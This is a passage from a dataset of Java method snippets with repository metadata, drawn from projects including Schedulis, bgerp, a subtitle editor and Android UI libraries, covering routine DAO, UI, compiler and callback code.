result = result.replaceFirst(Pattern.quote(CONTEXT_SERVER_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_PROJECT_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_PROJECT_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_FLOW_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_FLOW_TOKEN), tokenValue);\n\n    tokenValue = encodeQueryParam(contextInfo.get(CONTEXT_JOB_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_JOB_TOKEN), tokenValue);\n\n    tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_EXECUTION_ID_TOKEN), withEncoding);\n    result = result.replaceFirst(Pattern.quote(CONTEXT_EXECUTION_ID_TOKEN), tokenValue);\n\n    tokenValue =\n        encodeQueryParam(contextInfo.get(CONTEXT_JOB_STATUS_TOKEN), withEncoding);\n\n    result = result.replaceFirst(Pattern.quote(CONTEXT_JOB_STATUS_TOKEN), tokenValue);\n\n    return result;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59060, "method_name": "encodeQueryParam", "class_name": "JobCallbackUtil", "params": ["String", "boolean"], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "  private static String encodeQueryParam(final String str, final boolean withEncoding) {\n    if (!withEncoding) {\n      return str;\n    }\n    try {\n      return URLEncoder.encode(str, \"UTF-8\");\n    } catch (final UnsupportedEncodingException e) {\n      throw new IllegalArgumentException(\n          \"Encountered problem during encoding:\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/JobCallbackUtil.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59061, "method_name": "unspecified", "class_name": "DynamicAction", "params": ["ActionMapping", "DynActionForm", "ConnectionSet"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "ActionForward", "snippet": "    protected ActionForward unspecified(ActionMapping mapping, DynActionForm form, ConnectionSet conSet)\n            throws Exception {\n        return data(conSet, mapping, form, FORWARD_DEFAULT);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/struts/action/admin/DynamicAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59062, "method_name": "recompileAll", "class_name": "DynamicAction", "params": ["ActionMapping", "DynActionForm", "ConnectionSet"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "    public ActionForward recompileAll(ActionMapping mapping, DynActionForm form, ConnectionSet conSet)\n            throws Exception {\n        CompilationResult result = DynamicClassManager.getInstance().recompileAll();\n\n        EventProcessor.subscribeDynamicClasses();\n\n        form.getResponse().setData(\"result\", result);\n\n        return data(conSet, mapping, form, FORWARD_DEFAULT);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/struts/action/admin/DynamicAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59063, "method_name": "runDynamicClass", "class_name": "DynamicAction", "params": ["ActionMapping", "DynActionForm", "ConnectionSet"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "    public ActionForward runDynamicClass(ActionMapping mapping, DynActionForm form, ConnectionSet conSet)\n            throws Exception {\n        String className = form.getParam(\"class\");\n\n        String ifaceType = form.getParam(\"iface\", \"event\");\n        // \u0437\u0430\u043f\u0443\u0441\u043a \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430 EventListener\n        if (\"event\".equals(ifaceType))\n            EventProcessor.processEvent(new RunClassRequestEvent(form), className, conSet);\n        // \u0437\u0430\u043f\u0443\u0441\u043a \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430 Runnable\n        else {\n            Class<?> clazz = null;\n            try {\n                clazz = DynamicClassManager.getClass(className);\n            } catch (ClassNotFoundException e) {\n                throw new BGMessageException(\"\u041a\u043b\u0430\u0441\u0441 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d: \" + className);\n            }\n\n            if (Runnable.class.isAssignableFrom(clazz)) {\n                boolean sync = form.getParamBoolean(\"sync\");\n                if (sync)\n                    ((Runnable) clazz.getDeclaredConstructor().newInstance()).run();\n                else\n                    new Thread((Runnable) clazz.getDeclaredConstructor().newInstance()).start();\n            } else {\n                throw new BGMessageException(\"\u041a\u043b\u0430\u0441\u0441 \u043d\u0435 \u0440\u0435\u0430\u043b\u0438\u0437\u0443\u0435\u0442 java.land.Runnable: \" + className);\n            }\n        }\n\n        return status(conSet, form);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/struts/action/admin/DynamicAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 59064, "method_name": "main", "class_name": "Scanner2", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws IOException {\n\t\tint i, length, max;\n\t\tint[] vector;\n\t\tString str, path;\n\t\tBufferedReader br;\n\n\t\t// Input\n\t\tpath=\"hits_reshuffled.txt\";\n\n\t\t// Finding the maximum value\n\t\tbr = new BufferedReader(new FileReader(path),1000);\n\t\tmax=0;\n\t\tstr=br.readLine();  // Skipping the first line\n\t\tstr=br.readLine();\n\t\twhile (str!=null) {\n\t\t\ttry {length=Integer.parseInt(str); }\n\t\t\tcatch(NumberFormatException e) { break; }\n\t\t\tif (length>max) max=length;\n\t\t\tstr=br.readLine();\n\t\t}\n\t\tbr.close();\n\t\tvector = new int[max+1];\n\n\t\t// Building the histogram\n\t\tbr = new BufferedReader(new FileReader(path),1000);\n\t\tstr=br.readLine();  // Skipping the first line\n\t\tstr=br.readLine();\n\t\twhile (str!=null) {\n\t\t\ttry {length=Integer.parseInt(str); }\n\t\t\tcatch(NumberFormatException e) { break; }\n\t\t\tvector[length]++;\n\t\t\tstr=br.readLine();\n\t\t}\n\t\tbr.close();\n\n\t\t// Reporting\n\t\tfor (i=0; i<=max; i++) System.out.println(vector[i]);\n\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/Scanner2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59065, "method_name": "generateCode", "class_name": "StmPRINT", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result = \"\";\n\t\tresult += super.generateCode();\n\t\tswitch (expr.getType().getTypeCode()) {\n\t\tcase FLOAT:\n\t\t\tresult += tab() + \"printf(\\\"%f\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase INTEGER:\n\t\tcase ENUM:\n\t\t\tresult += tab() + \"printf(\\\"%d\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase BOOLEAN:\n\t\t\tresult += tab() + \"printf(\\\"%s\\\", (\";\n\t\t\tresult += expr.generateCode() + \" == 1) ? \\\"true\\\" : \\\"false\\\");\" + NL;\n\t\t\tbreak;\n\t\tcase STRING:\n\t\t\tresult += tab() + \"printf(\\\"%s\\\", \";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase POINTER:\n\t\t\tresult += tab() + \"printf(\\\"%lu\\\", (unsigned long)\";\n\t\t\tif (expr.isPOINTER())\n\t\t\t\tresult += ((ExprPOINTER)expr).getPointerCode() + \");\" + NL;\n\t\t\telse\n\t\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase ARRAY:\n\t\t\tresult += tab() + \"printf(\\\"ARRAY_%lx\\\", (unsigned long)\";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tcase STRUCT:\n\t\t\tresult += tab() + \"printf(\\\"STRUCT_%lx\\\", (unsigned long)\";\n\t\t\tresult += expr.generateCode() + \");\" + NL;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new CodeException(\"print\");\n\t\t}\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 59066, "method_name": "checkType", "class_name": "StmPRINT", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\texpr.checkType();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 59067, "method_name": "toString", "class_name": "StmPRINT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"print \" + expr;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmPRINT.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 59068, "method_name": "init", "class_name": "WaveView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n        path = new Path();\n        paint = new Paint();\n        paint.setColor(0xff1F2426);\n        paint.setAntiAlias(true);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59069, "method_name": "getHeadHeight", "class_name": "WaveView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHeadHeight() {\n        return headHeight;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59070, "method_name": "setHeadHeight", "class_name": "WaveView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHeadHeight(int headHeight) {\n        this.headHeight = headHeight;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59071, "method_name": "getWaveHeight", "class_name": "WaveView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getWaveHeight() {\n        return waveHeight;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59072, "method_name": "setWaveHeight", "class_name": "WaveView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWaveHeight(int waveHeight) {\n        this.waveHeight = waveHeight;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59073, "method_name": "setWaveColor", "class_name": "WaveView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWaveColor(@ColorInt int color) {\n        if (paint != null) paint.setColor(color);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59074, "method_name": "onDraw", "class_name": "WaveView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n        //\u91cd\u7f6e\u753b\u7b14\n        path.reset();\n        path.lineTo(0, headHeight);\n        //\u7ed8\u5236\u8d1d\u585e\u5c14\u66f2\u7ebf\n        path.quadTo(getMeasuredWidth() / 2, headHeight + waveHeight, getMeasuredWidth(), headHeight);\n        path.lineTo(getMeasuredWidth(), 0);\n        canvas.drawPath(path, paint);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59075, "method_name": "drawableToBitmap", "class_name": "WaveView", "params": ["Drawable"], "throws": null, "modifiers": ["static"], "return_type": "Bitmap", "snippet": "    static Bitmap drawableToBitmap(Drawable drawable) // drawable \u8f6c\u6362\u6210bitmap\n    {\n        int width = drawable.getIntrinsicWidth();// \u53d6drawable\u7684\u957f\u5bbd\n        int height = drawable.getIntrinsicHeight();\n        Bitmap.Config config = drawable.getOpacity() != PixelFormat.OPAQUE ? Bitmap.Config.ARGB_8888 : Bitmap.Config.RGB_565;// \u53d6drawable\u7684\u989c\u8272\u683c\u5f0f\n        Bitmap bitmap = Bitmap.createBitmap(width, height, config);// \u5efa\u7acb\u5bf9\u5e94bitmap\n        Canvas canvas = new Canvas(bitmap);// \u5efa\u7acb\u5bf9\u5e94bitmap\u7684\u753b\u5e03\n        drawable.setBounds(0, 0, width, height);\n        drawable.draw(canvas);// \u628adrawable\u5185\u5bb9\u753b\u5230\u753b\u5e03\u4e2d\n        return bitmap;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/bezierlayout/WaveView.java", "stars": "9", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 59076, "method_name": "searchGroup", "class_name": "CustomerGroupDAO", "params": ["SearchResult<CustomerGroup>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void searchGroup( SearchResult<CustomerGroup> searchResult )\n\t\tthrows BGException\n\t{\n\t\tsearchResult.getList().addAll( getGroupList() );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59077, "method_name": "getGroupList", "class_name": "CustomerGroupDAO", "params": [], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<CustomerGroup>", "snippet": "\tpublic List<CustomerGroup> getGroupList()\n\t\tthrows BGException\n\t{\n\t\tList<CustomerGroup> result = new ArrayList<CustomerGroup>();\n\t\t\n\t\ttry\n\t\t{\n\t\t\tString query = \"SELECT * FROM \" + TABLE_CUSTOMER_GROUP_TITLE + \" ORDER BY title\";\n\t\t\tPreparedStatement ps = con.prepareStatement( query );\n\t\t\t\n\t\t\tResultSet rs = ps.executeQuery();\n\t\t\twhile( rs.next() )\n\t\t\t{\n\t\t\t\tresult.add( getFromRs( rs ) );\n\t\t\t}\n\t\t\tps.close();\n\t\t}\n\t\tcatch( SQLException ex )\n\t\t{\n\t\t\tthrow new BGException( ex );\n\t\t}\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59078, "method_name": "getGroupById", "class_name": "CustomerGroupDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "CustomerGroup", "snippet": "\tpublic CustomerGroup getGroupById( int id )\n\t\tthrows BGException\n\t{\n\t\tCustomerGroup result = null;\n\t\t\n\t\ttry\n\t\t{\n\t\t\tString query = \"SELECT * FROM \" + TABLE_CUSTOMER_GROUP_TITLE + \" WHERE id=?\";\n\t\t\tPreparedStatement ps = con.prepareStatement( query );\n\t\t\tps.setInt( 1, id );\n\t\t\t\n\t\t\tResultSet rs = ps.executeQuery();\n\t\t\tif( rs.next() )\n\t\t\t{\n\t\t\t\tresult = getFromRs( rs );\n\t\t\t}\n\t\t\tps.close();\n\t\t}\n\t\tcatch( SQLException ex )\n\t\t{\n\t\t\tthrow new BGException( ex );\n\t\t}\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59079, "method_name": "updateGroup", "class_name": "CustomerGroupDAO", "params": ["CustomerGroup"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void updateGroup( CustomerGroup group )\n\t\tthrows BGException\n\t{\n\t\ttry\n\t\t{\n\t\t\tPreparedStatement ps = null;\n\t\t\t\n\t\t\tif( group.getId() <= 0 )\n\t\t\t{\n\t\t\t\tps = con.prepareStatement( \"INSERT INTO \" + TABLE_CUSTOMER_GROUP_TITLE + \" (title, comment) VALUES (?,?)\", \n\t\t\t\t                           PreparedStatement.RETURN_GENERATED_KEYS );\t\t\t\t\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tps = con.prepareStatement( \"UPDATE \" + TABLE_CUSTOMER_GROUP_TITLE + \" SET title=?, comment=? WHERE id=?\" );\n\t\t\t\tps.setInt( 3, group.getId() );\n\t\t\t}\n\t\t\t\n\t\t\tps.setString( 1, group.getTitle() );\n\t\t\tps.setString( 2, group.getComment() );\n\t\t\tps.executeUpdate();\n\t\t\t\n\t\t\tif( group.getId() <= 0 )\n\t\t\t{\n\t\t\t\tgroup.setId( SQLUtils.lastInsertId( ps ) );\n\t\t\t}\n\t\t\tps.close();\t\t\t\n\t\t}\n\t\tcatch( SQLException e )\n\t\t{\n\t\t\tthrow new BGException( e );\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59080, "method_name": "deleteGroup", "class_name": "CustomerGroupDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void deleteGroup( int id )\n\t\tthrows BGException\n\t{\n\t\tdeleteById( TABLE_CUSTOMER_GROUP_TITLE, id );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59081, "method_name": "getFromRs", "class_name": "CustomerGroupDAO", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "CustomerGroup", "snippet": "\tprivate CustomerGroup getFromRs( ResultSet rs )\n\t\tthrows SQLException\n\t{\n\t\tCustomerGroup result = new CustomerGroup();\n\t\t\n\t\tresult.setId( rs.getInt( \"id\" ) );\n\t\tresult.setTitle( rs.getString( \"title\" ) );\n\t\tresult.setComment( rs.getString( \"comment\" ) );\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerGroupDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 59082, "method_name": "setUp", "class_name": "ExposureNotificationApplicationTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUp() {\n    application = ApplicationProvider.getApplicationContext();\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/app/src/test/java/com/google/android/apps/exposurenotification/ExposureNotificationApplicationTest.java", "stars": "205", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59083, "method_name": "onCreate", "class_name": "ExposureNotificationApplicationTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onCreate() {\n    application.onCreate();\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/app/src/test/java/com/google/android/apps/exposurenotification/ExposureNotificationApplicationTest.java", "stars": "205", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59084, "method_name": "onTerminate", "class_name": "ExposureNotificationApplicationTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onTerminate() {\n    application.onTerminate();\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/app/src/test/java/com/google/android/apps/exposurenotification/ExposureNotificationApplicationTest.java", "stars": "205", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59085, "method_name": "initialize", "class_name": "TranPanelControl", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n        \n        Tran.getStylesheets().add(LightTheme.toString());\n        \n        TranOnline_Split_Left_Text.prefWidthProperty().bind(TranOnline_Split_Left.widthProperty());\n        TranOnline_Split_Left_Text.prefHeightProperty().bind(TranOnline_Split_Left.heightProperty());\n        TranOnline_Split_Right_Text.prefWidthProperty().bind(TranOnline_Split_Right.widthProperty());\n        TranOnline_Split_Right_Text.prefHeightProperty().bind(TranOnline_Split_Right.heightProperty());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59086, "method_name": "modeChange", "class_name": "TranPanelControl", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void modeChange(Boolean ModeState){\n        /*\u79fb\u9664\u6240\u6709\u6837\u5f0f\u8868*/\n        Tran.getStylesheets().remove(LightTheme);\n        Tran.getStylesheets().remove(DarkTheme);\n        if(ModeState)\n            Tran.getStylesheets().add(LightTheme.toString());\n        else\n            Tran.getStylesheets().add(DarkTheme.toString());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59087, "method_name": "Hide", "class_name": "TranPanelControl", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void Hide(){\n        Tran_Offline_Panel.setVisible(false);\n        Tran_Online_Panel.setVisible(false);\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59088, "method_name": "onTran_Online", "class_name": "TranPanelControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTran_Online(ActionEvent actionEvent) {\n        ListGroup.selectToggle(Tran_Online);\n        Tran_Online.setSelected(true);\n        \n        if(controller.focus_indicator.equals(Tran_Online.getId()))\n            return;\n        controller.focus_indicator=Tran_Online.getId();\n        Hide();\n        if(!Tran_Online_State){\n            String id=ConfigRWUtil.GetInterfaceInformation(\"app_id\",new ConfigPathUtil().getBaiduTarnInfoPath());\n            String key=ConfigRWUtil.GetInterfaceInformation(\"secret_key\",new ConfigPathUtil().getBaiduTarnInfoPath());\n            if(id==null||key==null||key.equals(\"\")||id.equals(\"\"))\n                new InterfaceInformationUtil().OnlineServeInputPrompt(2);\n            ArrayList<String> LanguageList=new TranslationUtil().getLanguageList();\n            \n            TranOnline_Target.setItems(FXCollections.observableArrayList(LanguageList));\n            TranOnline_Original.setItems(FXCollections.observableArrayList(LanguageList));\n            TranOnline_Target.getItems().remove(0);\n            TranOnline_Original.getSelectionModel().selectFirst();\n            TranOnline_Target.getSelectionModel().selectFirst();\n        }\n        \n        TranOnline_Split_Left_Text.setText(controller.inputset.getText());\n        TranOnline_Split_Right_Text.setText(\"\");\n        Tran_Online_Panel.setVisible(true);\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59089, "method_name": "onTran_Offline", "class_name": "TranPanelControl", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTran_Offline(ActionEvent actionEvent) {\n        ListGroup.selectToggle(Tran_Offline);\n        Tran_Offline.setSelected(true);\n        \n        if(controller.focus_indicator.equals(Tran_Offline.getId()))\n            return;\n        controller.focus_indicator=Tran_Offline.getId();\n        Hide();\n        Tran_Offline_Panel.setVisible(true);\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59090, "method_name": "onTranOnline_Start", "class_name": "TranPanelControl", "params": ["ActionEvent"], "throws": ["ExecutionException", "InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTranOnline_Start(ActionEvent actionEvent) throws ExecutionException, InterruptedException {\n        String Original=(String)TranOnline_Original.getValue();\n        String Target=(String)TranOnline_Target.getValue();\n        /* \u8f93\u5165\u8bed\u8a00\u4e0e\u8f93\u51fa\u8bed\u8a00\u76f8\u540c\uff0c\u76f4\u63a5\u8fd4\u56de*/\n        if(Original.equals(Target)) {\n            new ToastUtil().toast(\"\u9519\u8bef\uff01\u65e0\u6cd5\u4ece\" + Original + \"\u7ffb\u8bd1\u81f3\" + Target, 1000);\n            return;\n        }\n        String TranRes=new TranslationUtil().TransText_Baidu(controller.inputset.getText(),(String)TranOnline_Original.getValue(),(String)TranOnline_Target.getValue(),controller.inputset.getSubType());\n        if(!(TranRes==null)){\n            TranOnline_Split_Right_Text.setText(TranRes);\n            controller.inputset.setText(TranOnline_Split_Right_Text.getText());\n            new ToastUtil().toast(\"\u7ffb\u8bd1\u5b8c\u6210\uff0c\u5df2\u81ea\u52a8\u4fdd\u5b58\u7ed3\u679c~\",1000);\n        }else{\n            new ToastUtil().toast(\"\u672a\u77e5\u9519\u8bef\uff01\u8bf7\u68c0\u67e5\u7f51\u7edc\u6216\u63a5\u53e3\u914d\u7f6e~\",1000);\n        }\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/TranPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 59091, "method_name": "onCreateViewHolder", "class_name": "AppListRecyclerAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "    public ViewHolder onCreateViewHolder(@NonNull ViewGroup viewGroup, int viewType) {\n        View view = LayoutInflater.from(context).inflate(R.layout.app_list_item, viewGroup, false);\n        return new ViewHolder(view);\n    }", "url": "https://raw.githubusercontent.com/databurn-in/PrivacyBreacher/master/app/src/main/java/io/nandandesai/privacybreacher/AppListRecyclerAdapter.java", "stars": "64", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59092, "method_name": "onBindViewHolder", "class_name": "AppListRecyclerAdapter", "params": ["ViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull ViewHolder viewHolder, int position) {\n        App app = apps.get(position);\n\n        viewHolder.appIcon.setImageDrawable(app.getIcon());\n        viewHolder.appName.setText(app.getName());\n    }", "url": "https://raw.githubusercontent.com/databurn-in/PrivacyBreacher/master/app/src/main/java/io/nandandesai/privacybreacher/AppListRecyclerAdapter.java", "stars": "64", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59093, "method_name": "getItemCount", "class_name": "AppListRecyclerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return apps.size();\n    }", "url": "https://raw.githubusercontent.com/databurn-in/PrivacyBreacher/master/app/src/main/java/io/nandandesai/privacybreacher/AppListRecyclerAdapter.java", "stars": "64", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59094, "method_name": "getName", "class_name": "App", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getName() {\n            return name;\n        }", "url": "https://raw.githubusercontent.com/databurn-in/PrivacyBreacher/master/app/src/main/java/io/nandandesai/privacybreacher/AppListRecyclerAdapter.java", "stars": "64", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 59095, "method_name": "getIcon", "class_name": "App", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Drawable", "snippet": "        public Drawable getIcon() {\n            return icon;\n        }", "url": "https://raw.githubusercontent.com/databurn-in/PrivacyBreacher/master/app/src/main/java/io/nandandesai/privacybreacher/AppListRecyclerAdapter.java", "stars": "64", "class_props": {"extends": null, "implements": null, "modifiers": ["public", 